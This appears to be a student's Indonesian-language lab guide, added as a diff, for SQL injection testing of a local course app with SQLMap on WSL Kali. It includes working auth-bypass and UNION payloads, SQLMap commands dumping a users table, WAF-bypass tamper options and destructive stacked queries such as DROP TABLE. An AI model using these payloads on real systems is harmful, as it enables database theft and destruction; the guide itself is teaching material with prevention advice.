@@ -1,0 +1,556 @@
+# 🔍 SQLMap Security Testing Guide
+
+Panduan lengkap untuk melakukan security testing menggunakan SQLMap di WSL Kali Linux.
+
+## 📌 Bagian 1: Setup WSL dan Kali Linux
+
+### Step 1: Install WSL di Windows
+
+1. Buka **PowerShell** sebagai Administrator (klik kanan → Run as Administrator)
+
+2. Jalankan command untuk enable WSL:
+```powershell
+wsl --install
+```
+
+3. Jika sudah pernah install WSL tapi belum ada distro Kali Linux, install Kali dengan:
+```powershell
+wsl --install -d kali-linux
+```
+
+4. **Restart komputer** setelah instalasi selesai
+
+### Step 2: Setup Kali Linux
+
+1. Setelah restart, buka **Kali Linux** dari Start Menu
+
+2. Pada first run, Kali akan meminta username dan password baru:
+```bash
+# Masukkan username (contoh: hacker)
+# Masukkan password (minimal 6 karakter)
+```
+
+3. Update system dan package manager:
+```bash
+sudo apt update && sudo apt upgrade -y
+```
+
+4. Install tools yang diperlukan:
+```bash
+sudo apt install python3 python3-pip git curl -y
+```
+
+### Step 3: Install SQLMap
+
+1. Install SQLMap via apt:
+```bash
+sudo apt install sqlmap -y
+```
+
+2. Atau install versi terbaru dari GitHub:
+```bash
+cd ~
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+cd sqlmap-dev
+```
+
+3. Verify instalasi:
+```bash
+sqlmap --version
+```
+
+## 📌 Bagian 2: Testing SQL Injection di SnowCommerce
+
+### Persiapan Testing
+
+1. **Pastikan aplikasi SnowCommerce sudah running** di Windows:
+```powershell
+# Di PowerShell Windows (bukan WSL)
+cd "C:\Users\ghisy\Downloads\Kuliah\Semester 4 (PRIME SEMESTER BISMILLAH)\Keamanan Siber"
+pnpm dev
+```
+
+2. **Buka browser** dan akses `http://localhost:3000` untuk memastikan aplikasi berjalan
+
+3. **Login** dengan akun admin atau buat akun baru di register page
+
+### Testing 1: Vulnerable Login (Authentication Bypass)
+
+Endpoint login memiliki kerentanan SQL injection yang memungkinkan authentication bypass.
+
+1. **Test basic vulnerability dengan curl:**
+```bash
+# Di Kali Linux WSL
+curl -X POST http://localhost:3000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@test.com'\'' OR '\''1'\''='\''1","password":"anything"}'
+```
+
+2. **Test dengan SQLMap:**
+```bash
+sqlmap -u "http://localhost:3000/api/auth/login" \
+  --method POST \
+  --data '{"email":"test@test.com","password":"test"}' \
+  --headers "Content-Type: application/json" \
+  --batch \
+  --risk=3 \
+  --level=5
+```
+
+3. **Payload-payload injection yang bisa dicoba:**
+```bash
+# OR 1=1 attack
+{"email":"' OR '1'='1","password":"anything"}
+
+# Comment attack  
+{"email":"admin123@gmail.com'--","password":""}
+
+# UNION attack
+{"email":"' UNION SELECT * FROM users WHERE '1'='1","password":""}
+```
+
+4. **Test dengan request file:**
+
+Buat file `login_request.txt`:
+```
+POST /api/auth/login HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+
+{"email":"test*","password":"test"}
+```
+
+Jalankan SQLMap:
+```bash
+sqlmap -r login_request.txt --batch --risk=3 --level=5 --tamper=space2comment
+```
+
+### Testing 2: Vulnerable Check Product Endpoint
+
+Endpoint ini menerima parameter `id` melalui query string dan vulnerable terhadap SQL injection.
+
+1. **Test basic injection:**
+```bash
+# OR 1=1 injection
+curl "http://localhost:3000/api/check-product?id=1%20OR%201=1"
+
+# UNION injection
+curl "http://localhost:3000/api/check-product?id=1%20UNION%20SELECT%20*%20FROM%20users"
+```
+
+2. **Automated scan dengan SQLMap:**
+```bash
+# Basic scan
+sqlmap -u "http://localhost:3000/api/check-product?id=1" --batch
+
+# Aggressive scan
+sqlmap -u "http://localhost:3000/api/check-product?id=1" \
+  --batch \
+  --risk=3 \
+  --level=5 \
+  --dbs
+```
+
+3. **Extract database tables:**
+```bash
+sqlmap -u "http://localhost:3000/api/check-product?id=1" \
+  --batch \
+  --tables
+```
+
+4. **Dump specific table (contoh: users table):**
+```bash
+sqlmap -u "http://localhost:3000/api/check-product?id=1" \
+  --batch \
+  -T users \
+  --dump
+```
+
+### Testing Manual dengan Curl
+
+Untuk understanding yang lebih baik, test secara manual:
+
+```bash
+# 1. Normal query
+curl "http://localhost:3000/api/check-product?id=1"
+
+# 2. OR 1=1 (bypass kondisi WHERE)
+curl "http://localhost:3000/api/check-product?id=1%20OR%201=1"
+
+# 3. Comment attack
+curl "http://localhost:3000/api/check-product?id=1'--"
+
+# 4. Time-based blind injection
+curl "http://localhost:3000/api/check-product?id=1%20AND%20SLEEP(5)"
+
+# 5. Boolean-based blind
+curl "http://localhost:3000/api/check-product?id=1%20AND%201=1"
+curl "http://localhost:3000/api/check-product?id=1%20AND%201=2"
+```
+
+## 📌 Bagian 3: Advanced SQLMap Options
+
+### Opsi-opsi Penting SQLMap
+
+```bash
+# Basic scan
+sqlmap -u "URL" --batch
+
+# Scan dengan level dan risk tinggi (lebih agresif)
+sqlmap -u "URL" --batch --risk=3 --level=5
+
+# List semua databases
+sqlmap -u "URL" --batch --dbs
+
+# List tables dari database tertentu
+sqlmap -u "URL" --batch -D nama_database --tables
+
+# Dump isi table
+sqlmap -u "URL" --batch -D nama_database -T nama_table --dump
+
+# Dump specific columns
+sqlmap -u "URL" --batch -D nama_database -T nama_table -C "email,password" --dump
+
+# Test POST request
+sqlmap -u "URL" --method POST --data "param=value" --batch
+
+# Bypass WAF/IDS dengan tamper scripts
+sqlmap -u "URL" --batch --tamper=space2comment,charencode
+
+# Save output ke file
+sqlmap -u "URL" --batch --dump --output-dir=./results
+
+# Test all parameters
+sqlmap -u "URL" --batch --level=5 --risk=3 --crawl=2
+
+# Force specific DBMS
+sqlmap -u "URL" --batch --dbms=MySQL
+
+# Verbose mode (lebih detail)
+sqlmap -u "URL" --batch -v 3
+```
+
+### Tamper Scripts untuk Bypass
+
+```bash
+# Space to comment
+sqlmap -u "URL" --tamper=space2comment
+
+# Charencode
+sqlmap -u "URL" --tamper=charencode
+
+# Multiple tampers
+sqlmap -u "URL" --tamper=space2comment,charencode,randomcase
+```
+
+### Testing dengan Different Techniques
+
+```bash
+# Boolean-based blind
+sqlmap -u "URL" --batch --technique=B
+
+# Time-based blind
+sqlmap -u "URL" --batch --technique=T
+
+# Error-based
+sqlmap -u "URL" --batch --technique=E
+
+# UNION query-based
+sqlmap -u "URL" --batch --technique=U
+
+# Stacked queries
+sqlmap -u "URL" --batch --technique=S
+
+# All techniques
+sqlmap -u "URL" --batch --technique=BEUSTQ
+```
+
+## 📌 Bagian 4: Troubleshooting
+
+### Error: "Connection refused" atau "Cannot connect to localhost"
+
+**Penyebab**: WSL tidak bisa akses localhost di Windows
+
+**Solusi 1**: Gunakan IP address Windows
+```bash
+# Di PowerShell Windows, cari IP address:
+ipconfig
+
+# Cari "IPv4 Address" dari adapter yang aktif
+# Biasanya 192.168.x.x
+
+# Gunakan IP tersebut di SQLMap:
+sqlmap -u "http://192.168.1.100:3000/api/check-product?id=1" --batch
+```
+
+**Solusi 2**: Gunakan WSL hostname
+```bash
+# Di WSL, cari IP Windows dengan:
+cat /etc/resolv.conf | grep nameserver | awk '{print $2}'
+
+# Output biasanya 172.x.x.x
+# Simpan ke variable:
+WINDOWS_IP=$(cat /etc/resolv.conf | grep nameserver | awk '{print $2}')
+
+# Test koneksi:
+curl http://$WINDOWS_IP:3000
+
+# Gunakan di SQLMap:
+sqlmap -u "http://$WINDOWS_IP:3000/api/check-product?id=1" --batch
+```
+
+**Solusi 3**: Edit /etc/hosts
+```bash
+# Tambahkan entry ke /etc/hosts
+echo "$(cat /etc/resolv.conf | grep nameserver | awk '{print $2}') windows.host" | sudo tee -a /etc/hosts
+
+# Test:
+curl http://windows.host:3000
+
+# Gunakan di SQLMap:
+sqlmap -u "http://windows.host:3000/api/check-product?id=1" --batch
+```
+
+### Error: SQLMap tidak menemukan injection point
+
+**Kemungkinan penyebab**:
+1. Endpoint sudah secure
+2. SQLMap belum test semua payload
+3. Format request tidak sesuai
+
+**Solusi**:
+```bash
+# 1. Tambahkan opsi lebih agresif:
+sqlmap -u "URL" --batch --risk=3 --level=5 --threads=10
+
+# 2. Force test semua parameters:
+sqlmap -u "URL" --batch --test-filter="MySQL" --dbms=MySQL
+
+# 3. Gunakan custom injection point:
+sqlmap -u "URL?id=1*" --batch
+
+# 4. Test dengan manual payload dulu:
+curl "URL?id=1' OR '1'='1"
+
+# 5. Check response manually:
+curl -v "URL?id=1"
+```
+
+### Error: Permission denied saat install
+
+```bash
+# Gunakan sudo:
+sudo apt install sqlmap -y
+
+# Atau untuk instalasi manual:
+sudo chown -R $USER:$USER ~/sqlmap-dev
+chmod +x ~/sqlmap-dev/sqlmap.py
+```
+
+### Error: Python version mismatch
+
+```bash
+# Check Python version:
+python3 --version
+
+# Jika perlu, install Python 3:
+sudo apt install python3 python3-pip -y
+
+# Update alternatives:
+sudo update-alternatives --install /usr/bin/python python /usr/bin/python3 1
+```
+
+### Development server tidak bisa diakses dari WSL
+
+```bash
+# Di PowerShell Windows, allow firewall:
+New-NetFirewallRule -DisplayName "WSL" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3000
+
+# Atau disable Windows Firewall untuk testing (tidak recommended):
+# Control Panel → System and Security → Windows Defender Firewall → Turn off
+```
+
+## 📌 Bagian 5: Tips dan Best Practices
+
+### Workflow Testing yang Efektif
+
+1. **Reconnaissance**
+   - Identifikasi semua input points
+   - Map aplikasi dengan crawler
+   - Identifikasi teknologi yang digunakan
+
+2. **Manual Testing**
+   - Test basic SQL injection dengan curl
+   - Observe error messages
+   - Verify vulnerability exists
+
+3. **Automated Scanning**
+   - Start dengan scan basic
+   - Jika tidak berhasil, tingkatkan risk/level
+   - Gunakan tamper scripts jika ada WAF
+
+4. **Exploitation**
+   - Extract database information
+   - Dump sensitive data
+   - Document findings
+
+5. **Reporting**
+   - Screenshot/log setiap test
+   - Document payload yang berhasil
+   - Note impact dan severity
+
+### SQLMap Performance Tips
+
+```bash
+# Gunakan threads untuk speed up:
+sqlmap -u "URL" --batch --threads=10
+
+# Skip test jika sudah found:
+sqlmap -u "URL" --batch --smart
+
+# Cache results:
+sqlmap -u "URL" --batch --flush-session
+
+# Resume session:
+sqlmap -u "URL" --batch --resume
+```
+
+### Do's ✅
+
+- Selalu test di environment lokal/development
+- Backup database sebelum testing
+- Dokumentasikan setiap test yang dilakukan
+- Gunakan `--batch` untuk mode non-interactive
+- Save output dengan `--output-dir`
+- Test dengan manual payloads dulu
+- Understand injection types
+
+### Don'ts ❌
+
+- Jangan test di production environment tanpa izin
+- Jangan gunakan level/risk maksimal tanpa pemahaman
+- Jangan share hasil test yang berisi data sensitif
+- Jangan gunakan tool ini untuk tujuan illegal
+- Jangan overwhelm target dengan terlalu banyak requests
+- Jangan abaikan legal/ethical boundaries
+
+## 📌 Bagian 6: Understanding SQL Injection
+
+### Types of SQL Injection
+
+1. **In-band SQLi**
+   - Error-based: Menggunakan error messages untuk extract data
+   - UNION-based: Menggunakan UNION untuk combine query results
+
+2. **Blind SQLi**
+   - Boolean-based: Observe different responses (true/false)
+   - Time-based: Menggunakan time delays untuk verify injection
+
+3. **Out-of-band SQLi**
+   - Menggunakan different channel untuk extract data
+   - DNS/HTTP requests
+
+### Common Payloads
+
+```sql
+-- Authentication Bypass
+' OR '1'='1
+' OR 1=1--
+admin'--
+' OR 'a'='a
+
+-- UNION Attack
+' UNION SELECT NULL--
+' UNION SELECT username, password FROM users--
+
+-- Comment Attack
+'--
+'#
+'/*
+
+-- Boolean Blind
+' AND 1=1--
+' AND 1=2--
+
+-- Time Blind
+' AND SLEEP(5)--
+' WAITFOR DELAY '00:00:05'--
+
+-- Stacked Queries
+'; DROP TABLE users--
+'; UPDATE users SET password='hacked'--
+```
+
+### How to Prevent SQL Injection
+
+1. **Use Prepared Statements** (Best Practice)
+```javascript
+// Bad (Vulnerable)
+const query = `SELECT * FROM users WHERE email = '${email}'`;
+
+// Good (Secure)
+const query = db.prepare('SELECT * FROM users WHERE email = ?');
+query.get(email);
+```
+
+2. **Input Validation**
+```javascript
+// Validate and sanitize all inputs
+if (!email.match(/^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/)) {
+  throw new Error('Invalid email');
+}
+```
+
+3. **Use ORM/Query Builders**
+```javascript
+// Using ORM
+const user = await User.findOne({ where: { email } });
+```
+
+4. **Least Privilege Principle**
+```sql
+-- Database user should only have necessary permissions
+GRANT SELECT ON products TO app_user;
+-- Don't grant DROP, UPDATE on sensitive tables
+```
+
+## 🎯 Quick Reference
+
+### Essential Commands
+```bash
+# Install WSL + Kali
+wsl --install -d kali-linux
+
+# Update Kali
+sudo apt update && sudo apt upgrade -y
+
+# Install SQLMap
+sudo apt install sqlmap -y
+
+# Get Windows IP
+cat /etc/resolv.conf | grep nameserver | awk '{print $2}'
+
+# Basic SQLMap test
+sqlmap -u "http://TARGET:3000/api/endpoint?id=1" --batch
+
+# Aggressive scan
+sqlmap -u "http://TARGET:3000/api/endpoint?id=1" --batch --risk=3 --level=5
+
+# Dump table
+sqlmap -u "http://TARGET:3000/api/endpoint?id=1" --batch -T users --dump
+```
+
+## 📚 Resources
+
+- SQLMap Official: https://github.com/sqlmapproject/sqlmap/wiki
+- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
+- WSL Documentation: https://docs.microsoft.com/en-us/windows/wsl/
+- Kali Linux Tools: https://www.kali.org/tools/
+
+## ⚠️ Legal Disclaimer
+
+Tool dan dokumentasi ini dibuat untuk tujuan edukasi dan security testing yang sah. Pengguna bertanggung jawab penuh atas penggunaan tool ini. Pastikan Anda memiliki izin yang sah sebelum melakukan security testing.
+
+---
+
+**Happy Testing! Stay Ethical! 🔐**
